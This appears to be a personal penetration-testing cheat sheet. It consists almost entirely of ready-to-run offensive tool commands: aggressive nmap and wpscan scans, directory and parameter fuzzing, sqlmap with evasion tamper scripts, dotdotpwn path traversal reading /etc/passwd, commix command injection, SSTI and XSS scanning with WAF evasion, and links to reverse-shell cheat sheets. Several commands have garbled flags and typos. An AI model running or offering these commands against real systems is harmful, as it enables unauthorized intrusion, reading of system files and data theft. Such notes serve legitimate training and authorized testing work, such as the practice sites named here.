## **Scan**
`nmap IP -sS -p- -Pn --min-rate 99999 --scan-delay 0 --version-all  --osscan-guess --script=vuln  -system-dns IP`

## **Crawl**
`echo "http://testphp.vulnweb.com/"| hackrawler`

`gospider -s “http://testphp.vulnweb.com/”[-cookie testA=a testB=b | --burp request.txt| -S urls.txt]  -d 4 -t 50 -c 50 |grep '\[code-200\]' | cut -d ' ' -f 5`


## **Screenshots**
`cat rest.txt | aquatone -out screenss2 -scan-timeout 450 -threads 100 -screenshot-timeout 500000`




## **Word press**
`wpscan --url http://site.com -t 90 --random-user-agent --detection-mode aggressive -e at,ap,cd,dbe,u,m --headers 'X-Forwarded-For: 127.0.0.1' --plugins-detection aggressive --plugins-version-detection aggressive --wp-version-all -o wpascan.txt`


## **Directory Fuzzing**
`wfuzz -c -w home/kali/THM/CTF/HappyEnd/DIR.txt  -u  http://example.com//FUZZ -d '{"name": "FUZZ", "anotherkey": "anothervalue"}'  -H  "Content-Type: application/json" \ -b  "NAME1=VALUE1; NAME2=VALUE2"  -R 1 -D 1 -t 99 --hc 404`



`ffuf [-u https://target.site.com/FUZZ | -raw raw.txt ] -p .01 -recursion-depth 1 -ac  -x proxy -X POST -d '{"name": "FUZZ", "anotherkey": "anothervalue"}'  -H  "Content-Type: application/json" \ -b  "NAME1=VALUE1; NAME2=VALUE2"   -w /home/kali/THM/CTF/HappyEnd/DIR.txt  -c   -t 99 -rate 300  -e .asp,.aspx,.jhtml,.jsa,.jsp,.log,.php,.html,.db,.sql,.txt,.cgi,.inc,.xml,~,,/`

```bash 
  ffuf [-u https://target.site.com/FUZZ | -raw raw.txt ] -p .01 -recursion-depth 1 -ac  -x proxy -X POST -d '{"name": "FUZZ", "anotherkey": "anothervalue"}'  -H  "Content-Type: application/json" \ -b  "NAME1=VALUE1; NAME2=VALUE2"   -w /home/kali/THM/CTF/HappyEnd/DIR.txt  -c   -t 99 -rate 300  -e .asp,.aspx,.jhtml,.jsa,.jsp,.log,.php,.html,.db,.sql,.txt,.cgi,.inc,.xml,~,,/
  -fc 404
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges            
  -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
```

## **Parameter Fuzz**
`arjun -i urls.txt -t 90 -oT getparams.txt  -w paramswordlist.txt -m GET  --stable  --disable-redirects --hraders "Accept-Language: en-US\nCookie: null"`


`arjun -i urls.txt -t 90 -oT postparams.txt -w paramswordlist.txt -m POST  --stable  --disable-redirects --hraders "Accept-Language: en-US\nCookie: null"`


`ffuf -w params.txt -u http://ffuf.me/cd/param/data?FUZZ=1 p .01 - -ac  -x proxy   -H  "Content-Type: application/json" \ -b  "NAME1=VALUE1; NAME2=VALUE2"   -c  -s -t 99 -rate 660 `


`ffuf -raw req.txt -w params.txt -c true -s -t 99 -rate 660 [in request param=FUZZ]`



## **VHOST Fuzzing**
`wfuzz -c -w subdomains.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100`


## **Payload Fuzzing**
`ffuf -w payloads.txt [-u http://ffuf.me/cd/param/data?Param=Fuzz| -raw req.txt ] -ac -X POST -d '{"name": "FUZZ", "anotherkey": "anothervalue"}'  -H  "Content-Type: application/json" \ -b  "NAME1=VALUE1; NAME2=VALUE2"   -w /home/kali/THM/CTF/allattacks.txt  -c   -t 99 -rate 300  c true -s -t 99 -rate 660  `


`wfuzz  -w allattacks.txt --hc 404'http://example.com/path?Param=FUZZ' -d '{"name": "FUZZ", "anotherkey": "anothervalue"}'  -H  "Content-Type: application/json" \ -b  "NAME1=VALUE1; NAME2=VALUE2"   -c -t 99 -hc 404`



## **parameter analysis**

`cat urls.txt |gf cors debug-pages debug_logic    http-auth idor img-traversal lfi  php-errors php-serialized php-sources  rce  sqli ssrf ssti upload-fields`

 


## **SQL Injection**
`sqlmap -u "http://testphp.vulnweb.com/listproducts.php?artist=sa"  --random-agent --threads=10 --risk 2 --level 5  --technique=ETS --batch --tamper=xforwardedfor,space2comment,randomcase,symboliclogical,between,greatest,least   --dbms=mysql -b`


## **LFI**

`dotdotpwn -m http-url -e %00.png -f /etc/passwd -M GET -d 7 -t 1 -u http://s2bmm.smart-made.com/xvwa/vulnerabilities/fi/?file=TRAVERSAL -k "/usr/sbin/nologin" -b`
`dotdotpwn -m http-url  -f /etc/passwd -M GET -d 7 -t 1 -u "http://s2bmm.smart-made.com/xvwa/vulnerabilities/fi/?file=TRAVERSAL" -k "/usr/sbin/nologin" -b` 


  

## **RCE** 

### OS Command  Injection
`commix -r /home/kali/Desktop/OSRH.txt --batch  --random-agent --hostname --level 2 --tamper=dollaratsigns,printf2echo,xforwardedfor,space2ifs`  

### SSTI

`./tinja url -u "http://s2bmm.smart-made.com/xvwa/vulnerabilities/ssti/?name=asd&submit="-d -H -H "Authentication: Bearer "  -d "username=Kirlia&password=notguessable" -c "PHPSESSID=ABC123" --proxyurl http://127.0.0.1:8080`
###  PHP shells

## **XSS**
`dalfox url http://target.com -X -d -H --cookie-from-raw req.txt   [--custom-payload | --remote-payloads=portswigger,payloadbox | --custom-payload xss.txt] [--mining-dict  | --remote-wordlists=burp,assetnote |--mining-dict-word param.txt | -p param ] --waf-evasion --report --poc-type http-request -o result.txt `


`dalfox file --rawdata   req.txt [--custom-payload | --remote-payloads=portswigger,payloadbox | --custom-payload xss.txt] [--mining-dict  | --remote-wordlists=burp,assetnote |--mining-dict-word param.txt | -p param ] --waf-evasion --report --poc-type http-request -o result.txt `


## **REV Shells**
  https://gtfobins.github.io/gtfobins/nano/
  https://www.revshells.com/
  https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet
  








 





